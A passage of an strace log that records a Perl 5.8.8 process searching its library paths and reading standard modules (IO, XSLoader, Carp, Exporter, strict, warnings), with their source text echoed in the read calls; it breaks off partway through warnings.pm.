10562 07:33:34.978955 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
10562 07:33:34.979006 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
10562 07:33:34.979049 getppid()         = 10560
10562 07:33:34.979108 stat64("/etc/perl/IO.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979122 stat64("/etc/perl/IO.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979135 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979148 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979161 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979173 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979186 stat64("/usr/lib/perl5/IO.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979198 stat64("/usr/lib/perl5/IO.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979211 stat64("/usr/share/perl5/IO.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979223 stat64("/usr/share/perl5/IO.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979235 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979248 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
10562 07:33:34.979268 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:34.979281 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.979292 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:34.979344 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
10562 07:33:34.979418 stat64("/etc/perl/XSLoader.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979432 stat64("/etc/perl/XSLoader.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979446 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979458 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979472 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979484 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979498 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979510 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979523 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979535 stat64("/usr/share/perl5/XSLoader.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979548 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.979561 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
10562 07:33:34.979581 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.979594 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.979605 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.979625 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
10562 07:33:34.979933 brk(0x8195000)    = 0x8195000
10562 07:33:34.980231 _llseek(8, 3407, [3407], SEEK_SET) = 0
10562 07:33:34.980248 _llseek(8, 0, [3407], SEEK_CUR) = 0
10562 07:33:34.980259 close(8)          = 0
10562 07:33:34.980341 stat64("/etc/perl/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980372 stat64("/etc/perl/Carp.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980386 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980399 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980413 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980425 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980439 stat64("/usr/lib/perl5/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980450 stat64("/usr/lib/perl5/Carp.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980463 stat64("/usr/share/perl5/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980475 stat64("/usr/share/perl5/Carp.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980488 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980500 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980513 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.980526 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
10562 07:33:34.980547 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.980561 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.980572 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.980589 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
10562 07:33:34.981073 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
10562 07:33:34.981101 read(8, "", 4096) = 0
10562 07:33:34.981112 close(8)          = 0
10562 07:33:34.981133 stat64("/etc/perl/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981147 stat64("/etc/perl/Exporter.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981160 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981173 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981187 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981203 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981217 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981229 stat64("/usr/lib/perl5/Exporter.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981242 stat64("/usr/share/perl5/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981254 stat64("/usr/share/perl5/Exporter.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981267 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981289 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981326 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.981354 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
10562 07:33:34.981388 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.981402 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.981413 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.981430 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
10562 07:33:34.981959 _llseek(8, 2217, [2217], SEEK_SET) = 0
10562 07:33:34.981978 _llseek(8, 0, [2217], SEEK_CUR) = 0
10562 07:33:34.981988 close(8)          = 0
10562 07:33:34.982060 stat64("/etc/perl/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982077 stat64("/etc/perl/strict.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982094 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982107 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982121 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982134 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982147 stat64("/usr/lib/perl5/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982159 stat64("/usr/lib/perl5/strict.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982172 stat64("/usr/share/perl5/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982184 stat64("/usr/share/perl5/strict.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982197 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982209 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982223 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982235 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
10562 07:33:34.982256 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.982270 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.982293 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.982340 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
10562 07:33:34.982508 _llseek(8, 598, [598], SEEK_SET) = 0
10562 07:33:34.982523 _llseek(8, 0, [598], SEEK_CUR) = 0
10562 07:33:34.982533 close(8)          = 0
10562 07:33:34.982570 stat64("/etc/perl/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982584 stat64("/etc/perl/warnings.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982597 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982610 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982624 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982637 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982651 stat64("/usr/lib/perl5/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982663 stat64("/usr/lib/perl5/warnings.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982676 stat64("/usr/share/perl5/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982688 stat64("/usr/share/perl5/warnings.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982701 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982713 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982727 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:34.982739 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
10562 07:33:34.982764 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:34.982789 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.982828 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:34.982864 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    